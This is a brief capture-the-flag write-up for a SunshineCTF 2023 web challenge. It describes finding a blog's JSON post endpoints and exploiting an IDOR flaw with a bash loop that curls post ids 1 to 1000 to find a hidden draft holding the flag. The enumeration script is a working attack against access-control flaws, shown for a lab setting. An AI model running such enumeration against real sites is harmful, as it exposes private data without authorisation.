# Chall Description
A few robots got together and started a blog! It's full of posts that make absolutely no sense, but a little birdie told me that one of them left a secret in their drafts. Can you find it?
https://beepboop.web.2023.sunshinectf.games

# Write up
Using burp to browse to the address given reveals a request to `/posts`. Checking the source shows that this is json file that's contains all blog posts and is being used to fill the main page:

{"posts":[{"post: *text*, "post_url":*url*,"user":*username*}...]}

Opening a single blog post reveals a second request to `/post/*id*`, that gets a different json file:
{"hidden":*boolean*,"post":*text*,"user":*username*}

Following this, we have an IDOR vulnerability, and can make a simple script to iterate over each post id and check which post has `hidden: true` set.

```
#!/bin/bash
#

for i in {1..1000}
do
        curl -k "https://beepboop.web.2023.sunshinectf.games/post/$i/" | grep '"hidden":true'
done```

And we have the flag.